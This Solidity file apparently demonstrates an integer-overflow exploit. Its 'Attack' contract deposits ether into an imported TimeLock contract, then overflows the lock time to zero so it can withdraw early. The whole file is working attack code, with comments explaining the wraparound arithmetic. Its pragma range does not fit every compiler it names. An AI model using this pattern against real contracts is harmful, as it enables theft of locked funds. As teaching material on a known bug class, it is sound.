// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <=0.8.9;

import "./TimeLock.sol";

contract Attack {

    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = _timeLock;
    }

    fallback() external payable {}

    /**
     * @notice The start point to the attack.
     */
    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
         *   if t = current lock time then we need to find x such that
         *   x + t = 2**256 = 0
         *   so x = -t
         *   2**256 = type(uint).max + 1
         *   so x = type(uint).max + 1 - t
         */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }

}